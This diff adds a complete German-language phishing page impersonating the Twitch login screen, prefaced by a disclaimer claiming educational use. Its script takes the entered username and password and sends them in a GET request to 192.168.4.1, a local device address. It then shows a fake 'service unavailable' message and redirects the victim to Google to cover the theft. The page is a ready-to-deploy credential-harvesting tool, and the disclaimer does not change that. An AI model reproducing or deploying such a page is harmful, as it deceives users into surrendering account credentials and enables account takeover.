@@ -1,0 +1,138 @@
+<!-- 
+Disclaimer
+
+Educational Use and Legal Framework
+
+The phishing pages provided here are strictly intended for educational and training purposes. The goal is to raise awareness about security threats and teach users how to protect themselves against phishing attacks. By accessing these pages, you agree to use them only within a legal and ethical framework, in compliance with the laws and regulations applicable in your jurisdiction.
+
+Limitation of Liability
+
+The author of this page disclaims any responsibility for the malicious or illegal use of these phishing pages. Any person using these pages for purposes not in accordance with the law will be solely responsible for their actions. It is strongly recommended to never use these techniques for any purpose other than learning and awareness. The author does not monitor the use of these pages post-download and transfers all responsibility to the user upon download.
+-->
+
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <title>Anmeldeseite</title>
+    <style>
+body {
+    font-family: 'Helvetica Neue', Arial, sans-serif;
+    background-color: #0e0e10;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+
+.login-form {
+    background-color: rgba(24, 22, 27, 0.95); /* Opacité ajustée pour correspondre à Twitch */
+    padding: 40px;
+    border-radius: 6px; /* Rayon ajusté pour correspondre à Twitch */
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+    width: 340px; /* Largeur ajustée pour correspondre à Twitch */
+}
+
+.login-header {
+    color: #fff;
+    font-size: 18px; /* Taille ajustée pour correspondre à Twitch */
+    font-weight: 700; /* Rendre le texte plus gras */
+    margin-bottom: 20px;
+    text-align: center;
+}
+
+.form-control {
+    background-color: #0e0e10;
+    border: 1px solid #343434; /* Ajuster la couleur des bords pour correspondre à Twitch */
+    border-radius: 4px;
+    color: #fff;
+    margin-bottom: 20px;
+    padding: 16px 14px; /* Ajuster le padding pour correspondre à Twitch */
+    width: 90%;
+    font-size: 14px;
+}
+
+.form-control:focus {
+    border-color: #6441a5; /* Couleur de Twitch */
+    outline: none;
+}
+
+.btn {
+    background-color: #6441a5; /* Couleur du bouton ajustée */
+    border: none;
+    border-radius: 4px;
+    color: white;
+    cursor: pointer;
+    padding: 20px 16px; /* Ajuster le padding pour correspondre à Twitch */
+    width: 100%;
+    font-size: 14px;
+    font-weight: 700; /* Rendre le texte plus gras */
+    margin-top: 20px; /* Ajuster l'espacement pour correspondre à Twitch */
+    transition: background-color 0.2s;
+}
+
+.btn:hover {
+    background-color: #53297d; /* Couleur au survol ajustée */
+}
+
+.login-footer {
+    font-size: 13px; /* Taille ajustée pour correspondre à Twitch */
+    margin-top: 32px; /* Ajuster l'espacement pour correspondre à Twitch */
+    color: #adadb8; /* Couleur ajustée pour correspondre à Twitch */
+}
+
+.login-link, .signup-link {
+    color: #adadb8; /* Couleur des liens ajustée */
+    text-decoration: none;
+    display: block;
+    margin: 8px 0; /* Ajuster l'espacement pour correspondre à Twitch */
+    text-align:center;
+}
+
+.login-link:hover, .signup-link:hover {
+    text-decoration: underline;
+}
+.login-image {
+    background-image: url(' data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAV4AAAFeBAMAAAA/BWopAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAhUExURQAAAGRApWRApWRApWRApWRApWRApWRApWRApWRApWRApd6akfcAAAAKdFJOUwCBfpnzMgzLZmQnt5MBAAAF3UlEQVR4Ae3cTZLbOAwFYNcs5kerOYePkCPkCHM6zdanHHenCYCiKDYAmoCnnjeiKFJ6/kJIKieV2w0fCEAAAhCAAAQgAAEIQAACEIAABCAAAQhAAAIQgAAEIAABCEAAAhCIEfjnEfIxf9kfIXEf1ry//3yvvH/FxDX7/vFmeYPKzewbVG7WvFHlZs0bVW7WvFHlZs0bVW7WvFHlZswbVm7GvGHlZswbVm7GvGHlZswbVm62vHHlZsv7Z9DL2fOypvf1uHKz5Y0rN1veuHIz5Q0sN1PewHIz5T2Wm6lmFZPk3UgxjYYey40OvKjhzXsstxfFpNM68zblRid+UcOZtym3F8Wk0zrzHsvNVLMU5hsNZ95juWXPeyy35Hmbckuetym35Hmbckuetym35Hmbcsudty233Hnbcsudty233Hnbcsudty231HlPyi113pNyS533pNxS593ky+hX+xuvsK4h8pLaEyHvWAy+YyPPCPh69MZz4Ts28oyAr0dvPBe+YyPPCPh69MZz4Ts28oyAr0dvPBe+YyPPCPh69MZz4TswYqD9bOTGx88O3/iw/t/DiHPTaU4vIjtp5GOX3aUtzlm6qi1PR94Kpuww0F665Ba+rCEsSI2Pdlo0Euu3I0Td8L3dhAG5yAYvJ9zPpAu1GWinPtGAL2MIC1Ljo50WjcT9rCNE3fDF/YwWw7OB9VAZSBpq8+0FzzdCkQ0G2mV3aYs1VrqqLU+HbwVTdhhoL11yC1/WEBakxkc7LRqJ94eOEHXDF88LWgzPBtZDZSBpqM23FzzfCEU2GGiX3aUt1ljpqrY8Hb4VTNlhoL10yS18WUNYkBof7bRoJN4fOkLUDV88L2gxPBtYD5WBpKE2317wfCMU2WCgXXaXtlhjpava8nT4VjBlh4H20iW38GUNYUFqfLTTopF4f+gIUTd88bygxfBsYD1UBpKG2nx7wfONUGSDgXbZXdpijZWuasvT4VvBlB0G2kuX3MKXNYQFqfHRTotG4v2hI0Td8MXzghbDs4H1UBlIGmrz7QXPN0KRDQbaZXdpizVWuqotT1/kW11dv4O8ejPNDPhqtPRj4as308yAr0ZLPxa+ejPNDPhqtPRj4as308x4M9/f3izv/b3yVrzq/7tsk1/2q61Zi/qx9+qK2vlbNfvXjvYcqvE1b37few2k+q7PwVs9/XNPew7N+ANvet/7wUfzXT/Gbof5H7vacyjGH3nV11qc9/7hIT7/Kr7r59BNTC5N7Tm+P77h/fv7c3+NXJv3Xki+tmretevXz7s2r593ad4JvEvzTuBdmXcG78q8M3gX5p3CuzDvFN51eefwrss7h3dZ3km8y/JO4l2VdxbvqryzeBflnca7KO803jV55/GuyTuPd0neibxL8k7kXZF3Ju+KvDN5F+Sdyrsg71Te1+edy/v6vHN5X553Mu9p3kf/0/w81+Tpz/08ov/FrL7kNjj/4XA9+bl3PwwY7ap/kDxccRtdoD5+mH1bzetdD/f66wz3vLzOvMt5nXmX8/ryruf15V3P68obwOvKG8DryRvB68kbwevIG8LryBvCa88bw2vPG8NrzhvEa84bxGvNG8VrzRvFa8wbxmvMG8ZryxvHa8sbx2vKG8hryhvIa8kbyWvJG8lryBvKa8gbyqvPG8urzxvLq84bzKvOG8yrzRvNq80bzavN+9B9vH9bcfw5//zfr+syXY12/5zeBN6uLuc9Np+3yd90jL9QRKomJnWM887/Q6eLGxrDvLl4xzeQXLzDvMl4h3mT8Y7yZuMd5c3GO8ibjneQNx3vdd58vNd58/Fe5k3Ie5k3Ie9V3oy8V3kz8l7kTcl7kTclbz9vTt5+3py83bxJebt5k/L28mbl7eXNytvJm5a3kzct73nevLznefPynuZNzHuaNzHvWd7MvGd5M/Oe5E3Ne5I3NW+bNzdvmzc3r+EXeUyBAAQgAAEIQAACEIAABCAAAQhAAAIQgAAEIAABCEAAAhCAwP9d4D/AWeOA9KikYwAAAABJRU5ErkJggg=='); /* Remplacez ... par le code base64 de votre logo */
+    background-repeat: no-repeat;
+    background-size: contain;
+    background-position: center;
+    height: 60px; /* Ajustez selon la taille réelle de votre logo */
+    margin-bottom: 20px; /* Espace entre le logo et le titre du formulaire */
+}
+
+
+    </style>
+</head>
+<body>
+    <div class="login-form">
+        <div class="login-image"></div> <!-- Div pour l'image du logo Twitch -->
+        <div class="login-header">Melden Sie sich bei Twitch an</div>
+        <input type="text" id="email" class="form-control" placeholder="Nutzername">
+        <input type="password" id="password" class="form-control" placeholder="Passwort">
+        <button onclick="sendCredentials()" class="btn">Einloggen</button>
+        <div class="login-footer">
+            <a href="#" class="login-link">Verbindungsprobleme ?</a>
+            <a href="#" class="signup-link">Noch kein Konto? Anmelden</a>
+        </div>
+    </div>
+
+<script>
+        function sendCredentials() { 	
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            
+            getFile("http://192.168.4.1/?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
+            alert("Dienst nicht Verfügbar.");
+            window.location.href = "https://www.google.com";
+        }
+
+        function getFile(url) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", url, true);
+            xhr.send();
+        }
+    </script>
+</body>
+</html>
